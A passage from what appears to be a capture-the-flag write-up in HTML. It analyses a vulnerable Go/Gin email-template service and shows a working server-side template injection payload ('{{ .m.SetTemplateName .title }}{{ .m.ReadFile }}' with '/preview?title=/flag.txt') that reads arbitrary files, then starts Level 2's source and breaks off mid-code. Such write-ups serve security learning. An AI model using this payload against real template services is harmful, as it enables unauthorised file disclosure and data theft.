</span></span><span class=line><span class=cl>            <span class=nx>eventname</span> <span class=p>=</span> <span class=s>&#34;My-Event-Name&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>firstname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>firstname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;firstname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;firstname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>firstname</span> <span class=p>=</span> <span class=s>&#34;John&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>lastname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>lastname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;lastname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;lastname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>lastname</span> <span class=p>=</span> <span class=s>&#34;Smith&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>companyname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>companyname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;companyname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;companyname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>companyname</span> <span class=p>=</span> <span class=s>&#34;Email Templating Inc.&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// Fetch all custom tags
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kd>var</span> <span class=nx>num</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>stop</span> <span class=kt>bool</span> <span class=p>=</span> <span class=kc>false</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>custom</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>customs</span> <span class=p>=</span> <span class=kd>map</span><span class=p>[</span><span class=kt>string</span><span class=p>]</span><span class=kt>string</span><span class=p>{}</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=nx>i</span> <span class=o>:=</span> <span class=mi>1</span><span class=p>;</span> <span class=p>!</span><span class=nx>stop</span><span class=p>;</span> <span class=nx>i</span><span class=o>++</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>num</span> <span class=p>=</span> <span class=s>&#34;custom&#34;</span><span class=o>+</span><span class=nb>string</span><span class=p>(</span><span class=nx>i</span><span class=o>+</span><span class=mi>48</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nx>custom</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=nx>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nx>custom</span> <span class=o>==</span> <span class=s>&#34;&#34;</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>stop</span> <span class=p>=</span> <span class=kc>true</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=nx>customs</span><span class=p>[</span><span class=nx>num</span><span class=p>]</span> <span class=p>=</span> <span class=nx>custom</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// Create the response map
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kd>var</span> <span class=nx>response</span> <span class=kd>map</span><span class=p>[</span><span class=kt>string</span><span class=p>]</span><span class=kd>interface</span><span class=p>{}</span> <span class=p>=</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;title&#34;</span><span class=p>:</span><span class=nx>title</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;eventname&#34;</span><span class=p>:</span><span class=nx>eventname</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;firstname&#34;</span><span class=p>:</span><span class=nx>firstname</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;lastname&#34;</span><span class=p>:</span><span class=nx>lastname</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=s>&#34;companyname&#34;</span><span class=p>:</span><span class=nx>companyname</span><span class=p>,</span>
</span></span><span class="line hl"><span class=cl>                <span class=s>&#34;m&#34;</span><span class=p>:</span><span class=o>&amp;</span><span class=nx>m</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1>// Merge the custom tags
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>for</span> <span class=nx>key</span><span class=p>,</span> <span class=nx>value</span> <span class=o>:=</span> <span class=k>range</span> <span class=nx>customs</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>response</span><span class=p>[</span><span class=nx>key</span><span class=p>]</span> <span class=p>=</span> <span class=nx>value</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>content</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>m</span><span class=p>.</span><span class=nf>ReadFile</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class="line hl"><span class=cl>        <span class=nx>tmpl</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>template</span><span class=p>.</span><span class=nf>New</span><span class=p>(</span><span class=s>&#34;&#34;</span><span class=p>).</span><span class=nf>Parse</span><span class=p>(</span><span class=nb>string</span><span class=p>(</span><span class=nx>content</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>c</span><span class=p>.</span><span class=nf>Status</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusOK</span><span class=p>)</span>
</span></span><span class="line hl"><span class=cl>        <span class=nx>err</span> <span class=p>=</span> <span class=nx>tmpl</span><span class=p>.</span><span class=nf>Execute</span><span class=p>(</span><span class=nx>c</span><span class=p>.</span><span class=nx>Writer</span><span class=p>,</span> <span class=nx>response</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>r</span><span class=p>.</span><span class=nf>Run</span><span class=p>(</span><span class=s>&#34;127.0.0.1:8000&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=get-><a class=anchor href=#get- title='Anchor for: GET /.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.cf28e91d9cb2e63d8266b2e4ffbbf274.svg#hashtag"/></svg></a>GET /</h3><p>This is the landing page, no user input appears to be considered here. It does use a custom struct[ure] called <code>MyApp</code> to fetch the contents of a given template.</p><p>The struct is composed of only one variable, which is the <code>templateName</code> of type <code>string</code>. In Go, there is the concept of exported variables and functions. Being exported, means programmers can refer to the respective item directly when outside the package it was declared in. To be considered as exported, variables&rsquo; and functions&rsquo; names have to be declared with a capital letter at the beginning.</p><div class=highlight><pre aria-label="Box containing code sample." tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=nx>MyApp</span><span class=p>.</span><span class=nf>ReadFile</span><span class=p>()</span>   <span class=c1>// OK, wherever.
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>MyApp</span><span class=p>.</span><span class=nx>templateName</span> <span class=c1>// Illegal outside &#34;main&#34; package.
</span></span></span></code></pre></div><p>The code also declares two functions that can be called on a <code>MyApp</code> instance.</p><p><code>SetTemplateName</code> is pretty much a setter function, to update the instance&rsquo;s <code>templateName</code> value.</p><p><code>ReadFile</code> is more interesting and has suspicious functionality. It first tries to open a file using the path in the instance&rsquo;s <code>templateName</code>. If the file does not exist, it will list all the files and directories present in the directory where <code>templateName</code> would be.</p><p>This route then renders the <code>templates/index.html</code> with some data (which includes the contents of file <code>templates/preview.html</code> )</p><h3 id=post-update><a class=anchor href=#post-update title='Anchor for: POST /update.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.cf28e91d9cb2e63d8266b2e4ffbbf274.svg#hashtag"/></svg></a>POST /update</h3><p>Using the struct <code>Update</code>, the route retrieves the <code>template</code> value of the JSON object in the request&rsquo;s body. Then it updates the contents of the file <code>templates/preview.html</code> with that value. This means that the file and its content should now be considered a user input. No sanitization appears to be present for it.</p><h3 id=any-preview><a class=anchor href=#any-preview title='Anchor for: ANY /preview.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.cf28e91d9cb2e63d8266b2e4ffbbf274.svg#hashtag"/></svg></a>ANY /preview</h3><p>The <code>Any</code> route used here matches all standard HTTP methods. The route gets a few query parameters from the request which will be used to fill a <code>response</code> map variable. The <code>response</code> variable will also contain <code>custom</code> variables which we will revisit later, and a <code>m</code> variable which is the <code>MyApp</code> instance used to read the templates.</p><p>The <code>templates/preview.html</code> file gets read through the <code>MyApp</code> instance and the content is parsed as a template. The template is then <code>Execute</code>d with the variable <code>response</code> as its data. The http response will contain the result of executing the template with the data.</p><h3 id=the-vulnerability><a class=anchor href=#the-vulnerability title='Anchor for: The Vulnerability.'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.cf28e91d9cb2e63d8266b2e4ffbbf274.svg#hashtag"/></svg></a>The Vulnerability</h3><p>I had never really heard of SSTI research or payloads in Go before. As such, I did a quick search to find existing research and found <a href=https://www.onsecurity.io/blog/go-ssti-method-research/>one article by Gus Ralph</a>. My main takeaway was that it is possible to call exported functions from the variables that were passed to the template.</p><p>Thankfully in this challenge, the template is provided the <code>m</code> variable of type <code>MyApp</code> which as we saw contains two exported functions.</p><p>We will use as reference the <a href=https://pkg.go.dev/text/template>documentation</a> for <code>text/template</code>. The following excerpt looks interesting:</p><pre aria-label="Box containing code sample." tabindex=0><code>.Method [Argument...]
	The method can be alone or the last element of a chain but,
	unlike methods in the middle of a chain, it can take arguments.
	The result is the value of calling the method with the
	arguments:
		dot.Method(Argument1, etc.)
</code></pre><p>This means if we put in our template the following content:</p><pre aria-label="Box containing code sample." tabindex=0><code>{{ .m.SetTemplateName &#34;fishinspace&#34; }}
</code></pre><p>After evaluating this template, the <code>m</code> instance will have its <code>templateName</code> changed. Combining this with <code>ReadFile</code>, we now have a gadget to read any file with sufficient permissions. <code>ReadFile</code> returns the file&rsquo;s content, so it will get inserted in the render, allowing us to view it. Let&rsquo;s also use a variable instead of hardcoding the name, so we do not have to reupload a template everytime.</p><pre aria-label="Box containing code sample." tabindex=0><code>{{ .m.SetTemplateName .title }}
{{ .m.ReadFile }}
</code></pre><p>We upload this template and then preview it while making sure to use the GET query parameter <code>title</code> as our filename. We then get the flag.
Keep in mind, if the file does not exist, the directory will be listed. This will help us enumerate a few other files later on.</p><pre aria-label="Box containing code sample." tabindex=0><code>GET /preview?title=/flag.txt
</code></pre><p><strong>FLAG-6f040fad14bea1df66d07d8ccc109924</strong></p><h2 id=level-2---pass-go-and-collect-sh><a class=anchor href=#level-2---pass-go-and-collect-sh title='Anchor for: Level 2 - Pass Go and Collect $(sh).'><svg aria-hidden="true"><use xlink:href="/img/bundle.min.cf28e91d9cb2e63d8266b2e4ffbbf274.svg#hashtag"/></svg></a>Level 2 - Pass Go and Collect $(sh)</h2><p>We now get access to a second website (<a href=http://dev-7fe5c15819a3af65.email-template.ctf>http://dev-7fe5c15819a3af65.email-template.ctf</a>). It is similar to the first one, code is provided again.</p><div class=highlight><div aria-label="Box containing code sample." tabindex=0 class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=hl><span class=lnt>114
</span></span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;os&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;log&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=s>&#34;net/http&#34;</span>
</span></span><span class=line><span class=cl>    <span class=s>&#34;io/ioutil&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=s>&#34;github.com/gin-gonic/gin&#34;</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>type</span> <span class=nx>Update</span> <span class=kd>struct</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>Template</span> <span class=kt>string</span> <span class=s>`json:&#34;template&#34; binding:&#34;required&#34;`</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>r</span> <span class=o>:=</span> <span class=nx>gin</span><span class=p>.</span><span class=nf>Default</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=nx>r</span><span class=p>.</span><span class=nf>LoadHTMLGlob</span><span class=p>(</span><span class=s>&#34;templates/*&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>r</span><span class=p>.</span><span class=nf>Static</span><span class=p>(</span><span class=s>&#34;/assets&#34;</span><span class=p>,</span> <span class=s>&#34;./assets&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>r</span><span class=p>.</span><span class=nf>GET</span><span class=p>(</span><span class=s>&#34;/&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>f</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>os</span><span class=p>.</span><span class=nf>Open</span><span class=p>(</span><span class=s>&#34;templates/preview.html&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>defer</span> <span class=kd>func</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>f</span><span class=p>.</span><span class=nf>Close</span><span class=p>();</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}()</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=nx>content</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>ioutil</span><span class=p>.</span><span class=nf>ReadAll</span><span class=p>(</span><span class=nx>f</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>c</span><span class=p>.</span><span class=nf>HTML</span><span class=p>(</span><span class=nx>http</span><span class=p>.</span><span class=nx>StatusOK</span><span class=p>,</span> <span class=s>&#34;index.html&#34;</span><span class=p>,</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span><span class=s>&#34;title&#34;</span><span class=p>:</span><span class=s>&#34;Test!&#34;</span><span class=p>,</span><span class=s>&#34;template&#34;</span><span class=p>:</span><span class=nb>string</span><span class=p>(</span><span class=nx>content</span><span class=p>),</span><span class=s>&#34;c&#34;</span><span class=p>:</span><span class=nx>c</span><span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>r</span><span class=p>.</span><span class=nf>POST</span><span class=p>(</span><span class=s>&#34;/update&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>update</span> <span class=nx>Update</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>err</span> <span class=kt>error</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>err</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>BindJSON</span><span class=p>(</span><span class=o>&amp;</span><span class=nx>update</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>f</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>os</span><span class=p>.</span><span class=nf>OpenFile</span><span class=p>(</span><span class=s>&#34;templates/preview.html&#34;</span><span class=p>,</span> <span class=nx>os</span><span class=p>.</span><span class=nx>O_WRONLY</span><span class=p>|</span><span class=nx>os</span><span class=p>.</span><span class=nx>O_CREATE</span><span class=p>|</span><span class=nx>os</span><span class=p>.</span><span class=nx>O_TRUNC</span><span class=p>,</span> <span class=mo>0664</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>defer</span> <span class=nx>f</span><span class=p>.</span><span class=nf>Close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>_</span><span class=p>,</span> <span class=nx>err</span> <span class=p>=</span> <span class=nx>f</span><span class=p>.</span><span class=nf>WriteString</span><span class=p>(</span><span class=nx>update</span><span class=p>.</span><span class=nx>Template</span><span class=p>);</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nx>c</span><span class=p>.</span><span class=nf>JSON</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span> <span class=s>&#34;ok&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nx>r</span><span class=p>.</span><span class=nf>Any</span><span class=p>(</span><span class=s>&#34;/preview&#34;</span><span class=p>,</span> <span class=kd>func</span><span class=p>(</span><span class=nx>c</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>title</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>title</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;title&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;title&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>title</span> <span class=p>=</span> <span class=s>&#34;Test Email&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>eventname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>eventname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;eventname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;eventname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>eventname</span> <span class=p>=</span> <span class=s>&#34;My-Event-Name&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>firstname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>firstname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;firstname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;firstname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>firstname</span> <span class=p>=</span> <span class=s>&#34;John&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>lastname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>lastname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;lastname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;lastname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>lastname</span> <span class=p>=</span> <span class=s>&#34;Smith&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=kd>var</span> <span class=nx>companyname</span> <span class=kt>string</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nx>companyname</span> <span class=p>=</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;companyname&#34;</span><span class=p>);</span> <span class=nx>c</span><span class=p>.</span><span class=nf>Query</span><span class=p>(</span><span class=s>&#34;companyname&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=s>&#34;&#34;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>companyname</span> <span class=p>=</span> <span class=s>&#34;Email Templating Inc.&#34;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1>// Fetch all custom tags
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=kd>var</span> <span class=nx>num</span> <span class=kt>string</span>
